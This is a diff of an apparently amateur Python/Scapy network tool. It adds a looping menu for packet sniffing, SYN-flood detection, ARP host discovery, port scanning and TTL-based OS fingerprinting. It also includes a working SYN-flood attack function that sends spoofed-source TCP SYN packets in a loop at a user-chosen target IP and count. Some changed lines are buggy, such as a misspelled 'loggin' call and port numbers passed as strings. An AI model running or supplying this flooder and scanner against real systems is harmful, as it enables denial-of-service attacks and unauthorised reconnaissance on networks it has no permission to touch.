@@ -6,9 +6,8 @@ import logging
 import matplotlib
 import csv
 
-
-logger = logging.getLogger("scapy")
-logger.setLevel(logging.INFO)
+logging.basicConfig(filename='info_network.log', level=logging.INFO,
+	 format='%(levelname)s:%(message)s')
 
 
 def print_output(sezion_name,response):
@@ -18,8 +17,6 @@ def print_output(sezion_name,response):
 
 	print( "-----------------------------------------------")
 
-
-
 # sniff all trafic in the network
 def sniff_interface(interface,count=20):
 	
@@ -27,34 +24,52 @@ def sniff_interface(interface,count=20):
 
 	protocol = ["","tcp", "udp","icmp"]	
 
+
+
 	for i in range(0,len( interface)):
 	
 		print(str(i) + "." +  interface[i])
 	
 	choose = (int(input("choose the network interface:	\n")))
 	
-	print("choose the protocol: \n")
 
-	choose_protocol = (int(input(" 0. all protocol \n 1. tcp \n 2. udp \n 3. icmp\n")))
+	print("choose the protocol: \n 0. all protocol \n 1. tcp \n 2. udp \n 3. icmp\n")
+
+	choose_protocol = (int(input("")))
 	
-	if  choose_protocol ==1 :
-		result = sniff(iface=interface[choose],count=count)
+
+	if  choose_protocol  == 0:
+	
+		result = sniff(iface = interface[choose],count = count)
+	
 	else:
-		result = sniff(iface=interface[choose],filter=protocol[choose_protocol],
+	
+		result = sniff(iface = interface[choose],filter = protocol[choose_protocol],
+	
 			count=count)
 	
 
-	print(result.show())	
+	print(result.show())
+	
+
+	logging.info('\n')
+	logging.info(time.ctime(time.time()))
+
+	logging.info(result)
+	
+	for row in result:
+	
+		logging.info(row.sprintf('{IP:%IP.src%}{IPv4:%IPv4.src%}	-> {IP:%IP.dst%}{IPv4:%IPv4.dst%}'))
+	
 	
 	more_information = input("visual more information on packet: (y/n) ")
-	
-	logging.getLogger(result)
 
 	if more_information == "y":
 	
 		for row in result:
-	
-			print(row.show())
+			
+			
+			logging.info(row)
 	
 	print( "-----------------------------------------------\n")
 
@@ -81,7 +96,11 @@ def attack_syn_flood(IP,number):
 	
 		w_indow = randInt()
 
-		ans,unans = srloop(IP(src = randomIP(),dst=IP)/TCP(sport=s_port ,dport=dstPort,seq = s_eq, window = w_indow, flags="S"),count=number)
+		ans,unans = srloop(IP(src = randomIP(),dst=IP)/
+			TCP(sport=s_port ,dport=dstPort,seq = s_eq, window = w_indow, flags="S"),
+			count=number)
+
+	return ans
 	
 
 def os_fingerprinting_load():
@@ -104,7 +123,7 @@ def os_fingerprinting(ttl,db_os_fingerprinting):
 	
 	for row in db_os_fingerprinting:
 		
-		if row[1]== ttl:
+		if row[1] == ttl:
 
 			return 'The Operative System is: '+row[0]
 
@@ -134,14 +153,20 @@ def get_mac(ip):
 # find host in the netwok
 def scan_host_network():
 
+	output =''
+
 	ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.178.0/24"),
 		timeout=2)
+
+	for row in ans : 
 	
-	return ans.nsummary()
+	 	output += str(row) 
+
+	return output ,ans
 
 def scan_udp(host):
 	
-	ans, unans = sr(IP(dst=host)/UDP(dport=[(1, 65535)]), inter=0.5, retry=10, 
+	ans, unans = sr(IP(dst = host)/UDP(dport = [(1, 65535)]), inter = 0.5, retry = 10, 
 		timeout=1)
 	
 	ans.nsummary()
@@ -152,13 +177,11 @@ def scan_port_host(ip_host,first_port,ultime_port):
 	return report_ports(ip_host,(first_port,ultime_port))
 	
 	
-
-
 def dection_syn_flood():
 
-	count =Counter()
-	
-	pkts = sniff(filter = 'tcp', count = 20)
+	count = Counter()
+
+	pkts = sniff(filter = 'tcp', count = 50)
 	
 	for pkt in  pkts:
 		
@@ -167,11 +190,8 @@ def dection_syn_flood():
 			src = pkt.sprintf('{IP:%IP.src%}{IPv4:%IPv4.src%}')
 	
 			count[src] = count[src] + 1	
-	
-			print(src)
 
-			return count
-
+	return count
 
 
 
@@ -181,41 +201,111 @@ def main():
 
 	db_os_fingerprinting=os_fingerprinting_load()
 
-	choose = int(input('choose what action to perform: '))
-	
-	print("1. sniff interface\n2. \n3. \n4. \n")
-	
-	if(choose == 1):
-	
-		print(sniff_interface(interface))
+	menu ='''\nChoose what action to perform:
+	1. Sniff interface
+	2. Dection syn flood
+	3. Attack syn flood
+	4. Scan host network  
+	5. Os_fingerprinting 
+	6. Scan port host\n''' 
 
-	elif (choose == 2):
-
-		print(dection_syn_flood())
-
-	elif (choose == 3):
-	
-		print(scan_host_network())
-	
-	elif (choose == 4):
-	
-		ip = input("ip insert")	
-	
-		print(send_ICMP(ip))
-	
-	elif (choose == 5):
+	while(True):
+		try :
+			choose = int(input(menu))
 		
-		ip = input("ip insert")	
-
-		print(os_fingerprinting(send_ICMP(ip),db_os_fingerprinting))
+			if(choose == 1):
 		
-	elif (choose ==6):
-	
-		print(scan_port_host('192.168.178.1',80,80))
+				sniff_interface(interface)
 
-	elif (choose ==7):
+			elif (choose == 2):
+
+				output ='\n'
+
+				logging.info('\n')
+
+				logging.info('Dection syn-flood')
+				
+				logging.info(time.ctime(time.time()))
+
+				count = dection_syn_flood()
+
+				for item in count:
+
+					output += str(item) +"	: "+str(count[item])+'\n'
+
+				logging.info(output)
+
+				print_output("dection syn-flood attack",output)
+
+			elif (choose == 3):
+
+				ip = input("ip target")	
+
+				logging.info('\n')
+
+				logging.info('attack syn flood')
+				
+				logging.info(time.ctime(time.time()))
+
+				number = int(input('numbers of attacks'))
+
+				loggin.info(attack_syn_flood(ip,number))
+
+			elif (choose == 4):	
+					
+				output,ans = scan_host_network()
+
+				logging.info('\n')
+
+				logging.info('Scan host network')
+				
+				logging.info(time.ctime(time.time()))
+
+				logging.info(str(output))
+
+				print(ans.show())
 		
-		print(get_mac('192.168.178.1'))
-	
+
+			elif (choose == 5):
+			
+				ip = input("ip target")	
+
+				logging.info('\n')
+
+				logging.info('Os fingerprinting ICMP')
+				
+				logging.info(time.ctime(time.time()))
+
+				count = dection_syn_flood()
+
+				output = os_fingerprinting(send_ICMP(ip),db_os_fingerprinting)
+				
+				logging.info(output)
+				
+				print(output)
+			
+			elif (choose == 6):
+
+				ip = input("ip target")	
+
+				port1 = str(int(input("first port")))
+
+				port2 = str(int(input("second port")))
+			
+				print(scan_port_host(ip,port1,port2))
+
+			elif (choose == 7):
+			
+				ip = input("ip target")	
+
+				print(get_mac(ip))
+			
+		except KeyboardInterrupt:
+
+			print('You pressed Ctrl+C!')
+
+			sys.exit(0)
+
 if __name__ == "__main__":
+
 	main()
